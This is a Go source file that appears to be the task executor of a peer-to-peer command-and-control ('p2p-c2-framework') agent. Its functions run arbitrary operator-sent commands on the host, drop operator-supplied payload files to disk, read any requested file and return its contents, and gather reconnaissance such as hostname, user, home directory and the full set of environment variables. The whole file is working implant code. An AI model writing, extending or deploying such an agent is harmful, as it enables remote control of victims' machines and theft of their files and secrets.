package agent

import (
	"fmt"
	"os"
	"os/exec"
	"p2p-c2-framework/core"
	"p2p-c2-framework/util"
	"strings"
	"time"
)

// TaskExecutor handles task execution for an agent
type TaskExecutor struct {
	peerID       string
	logger       *util.Logger
	workingDir   string
	tempDir      string
	capabilities map[string]bool
}

// NewTaskExecutor creates a new task executor
func NewTaskExecutor(peerID string, workingDir, tempDir string) *TaskExecutor {
	return &TaskExecutor{
		peerID:     peerID,
		logger:     util.GetLogger("executor"),
		workingDir: workingDir,
		tempDir:    tempDir,
		capabilities: map[string]bool{
			"command":       true,
			"file_transfer": true,
			"plugin":        true,
		},
	}
}

// ExecuteTask executes a task and returns the result
func (te *TaskExecutor) ExecuteTask(task *core.Task) *core.TaskResult {
	te.logger.Info("Executing task %s of type %s", task.ID, task.Type)

	// Mark task as started
	task.Start()

	// Create result
	result := &core.TaskResult{
		TaskID:      task.ID,
		Status:      core.TaskStatusRunning,
		CompletedAt: time.Now(),
		Metadata:    make(map[string]interface{}),
	}

	// Execute based on task type
	switch task.Type {
	case core.TaskTypeCommand:
		te.executeCommand(task, result)
	case core.TaskTypeFileUpload:
		te.executeFileUpload(task, result)
	case core.TaskTypeFileDownload:
		te.executeFileDownload(task, result)
	case core.TaskTypePlugin:
		te.executePlugin(task, result)
	default:
		result.Status = core.TaskStatusFailed
		result.Error = fmt.Sprintf("unsupported task type: %s", task.Type)
	}

	te.logger.Info("Task %s completed with status %s", task.ID, result.Status)
	return result
}

// executeCommand executes a command task
func (te *TaskExecutor) executeCommand(task *core.Task, result *core.TaskResult) {
	if !te.capabilities["command"] {
		result.Status = core.TaskStatusFailed
		result.Error = "command execution not supported"
		return
	}

	if task.Command == "" {
		result.Status = core.TaskStatusFailed
		result.Error = "no command specified"
		return
	}

	te.logger.Debug("Executing command: %s %v", task.Command, task.Arguments)

	// Create command
	cmd := exec.Command(task.Command, task.Arguments...)
	cmd.Dir = te.workingDir

	// Execute command
	output, err := cmd.CombinedOutput()
	if err != nil {
		result.Status = core.TaskStatusFailed
		result.Error = fmt.Sprintf("command execution failed: %v", err)
		result.Output = output
		return
	}

	result.Status = core.TaskStatusCompleted
	result.Output = output
	result.Metadata["exit_code"] = 0
	result.Metadata["command"] = task.Command
	result.Metadata["arguments"] = task.Arguments
}

// executeFileUpload handles file upload tasks
func (te *TaskExecutor) executeFileUpload(task *core.Task, result *core.TaskResult) {
	if !te.capabilities["file_transfer"] {
		result.Status = core.TaskStatusFailed
		result.Error = "file transfer not supported"
		return
	}

	filename, ok := task.GetMetadataString("filename")
	if !ok {
		result.Status = core.TaskStatusFailed
		result.Error = "no filename specified"
		return
	}

	if task.Payload == nil {
		result.Status = core.TaskStatusFailed
		result.Error = "no file data provided"
		return
	}

	// Determine file path
	filePath := fmt.Sprintf("%s/%s", te.tempDir, filename)

	// Write file
	err := os.WriteFile(filePath, task.Payload, 0644)
	if err != nil {
		result.Status = core.TaskStatusFailed
		result.Error = fmt.Sprintf("failed to write file: %v", err)
		return
	}

	result.Status = core.TaskStatusCompleted
	result.Metadata["filename"] = filename
	result.Metadata["file_path"] = filePath
	result.Metadata["file_size"] = len(task.Payload)
	result.Output = []byte(fmt.Sprintf("File uploaded successfully: %s", filePath))

	te.logger.Info("File uploaded: %s (%d bytes)", filePath, len(task.Payload))
}

// executeFileDownload handles file download tasks
func (te *TaskExecutor) executeFileDownload(task *core.Task, result *core.TaskResult) {
	if !te.capabilities["file_transfer"] {
		result.Status = core.TaskStatusFailed
		result.Error = "file transfer not supported"
		return
	}

	remotePath, ok := task.GetMetadataString("remote_path")
	if !ok {
		result.Status = core.TaskStatusFailed
		result.Error = "no remote path specified"
		return
	}

	// Read file
	fileData, err := os.ReadFile(remotePath)
	if err != nil {
		result.Status = core.TaskStatusFailed
		result.Error = fmt.Sprintf("failed to read file: %v", err)
		return
	}

	result.Status = core.TaskStatusCompleted
	result.Output = fileData
	result.Metadata["remote_path"] = remotePath
	result.Metadata["file_size"] = len(fileData)

	te.logger.Info("File downloaded: %s (%d bytes)", remotePath, len(fileData))
}

// executePlugin handles plugin execution tasks
func (te *TaskExecutor) executePlugin(task *core.Task, result *core.TaskResult) {
	if !te.capabilities["plugin"] {
		result.Status = core.TaskStatusFailed
		result.Error = "plugin execution not supported"
		return
	}

	// For now, implement basic built-in plugins
	switch task.Command {
	case "sysinfo":
		te.executeBuiltinSysinfo(task, result)
	case "whoami":
		te.executeBuiltinWhoami(task, result)
	case "pwd":
		te.executeBuiltinPwd(task, result)
	case "ls":
		te.executeBuiltinLs(task, result)
	default:
		result.Status = core.TaskStatusFailed
		result.Error = fmt.Sprintf("unknown plugin: %s", task.Command)
	}
}

// executeBuiltinSysinfo executes the built-in sysinfo plugin
func (te *TaskExecutor) executeBuiltinSysinfo(task *core.Task, result *core.TaskResult) {
	info := make(map[string]interface{})

	// Get hostname
	if hostname, err := os.Hostname(); err == nil {
		info["hostname"] = hostname
	}

	// Get working directory
	if wd, err := os.Getwd(); err == nil {
		info["working_directory"] = wd
	}

	// Get environment variables
	info["environment"] = os.Environ()

	// Get process ID
	info["pid"] = os.Getpid()

	// Get user info
	if user := os.Getenv("USER"); user != "" {
		info["user"] = user
	}

	// Get home directory
	if home := os.Getenv("HOME"); home != "" {
		info["home"] = home
	}

	// Convert to string
	var output strings.Builder
	output.WriteString("=== System Information ===\n")
	for key, value := range info {
		if key == "environment" {
			output.WriteString(fmt.Sprintf("%s: [%d environment variables]\n", key, len(value.([]string))))
		} else {
			output.WriteString(fmt.Sprintf("%s: %v\n", key, value))
		}
	}

	result.Status = core.TaskStatusCompleted
	result.Output = []byte(output.String())
	result.Metadata = info
}

// executeBuiltinWhoami executes the built-in whoami plugin
func (te *TaskExecutor) executeBuiltinWhoami(task *core.Task, result *core.TaskResult) {
	user := os.Getenv("USER")
	if user == "" {
		user = "unknown"
	}

	result.Status = core.TaskStatusCompleted
	result.Output = []byte(user)
	result.Metadata["user"] = user
}

// executeBuiltinPwd executes the built-in pwd plugin
func (te *TaskExecutor) executeBuiltinPwd(task *core.Task, result *core.TaskResult) {
	wd, err := os.Getwd()
	if err != nil {
		result.Status = core.TaskStatusFailed
		result.Error = fmt.Sprintf("failed to get working directory: %v", err)
		return
	}

	result.Status = core.TaskStatusCompleted
	result.Output = []byte(wd)
	result.Metadata["working_directory"] = wd
}

// executeBuiltinLs executes the built-in ls plugin
func (te *TaskExecutor) executeBuiltinLs(task *core.Task, result *core.TaskResult) {
	path := "."
	if len(task.Arguments) > 0 {
		path = task.Arguments[0]
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		result.Status = core.TaskStatusFailed
		result.Error = fmt.Sprintf("failed to list directory: %v", err)
		return
	}

	var output strings.Builder
	var files []string

	for _, entry := range entries {
		name := entry.Name()
		if entry.IsDir() {
			name += "/"
		}
		output.WriteString(name + "\n")
		files = append(files, name)
	}

	result.Status = core.TaskStatusCompleted
	result.Output = []byte(output.String())
	result.Metadata["path"] = path
	result.Metadata["files"] = files
	result.Metadata["count"] = len(files)
}

// HasCapability checks if the executor has a specific capability
func (te *TaskExecutor) HasCapability(capability string) bool {
	return te.capabilities[capability]
}

// GetCapabilities returns all available capabilities
func (te *TaskExecutor) GetCapabilities() []string {
	capabilities := make([]string, 0, len(te.capabilities))
	for capability, enabled := range te.capabilities {
		if enabled {
			capabilities = append(capabilities, capability)
		}
	}
	return capabilities
}

// SetCapability enables or disables a capability
func (te *TaskExecutor) SetCapability(capability string, enabled bool) {
	te.capabilities[capability] = enabled
	te.logger.Info("Capability %s set to %v", capability, enabled)
}

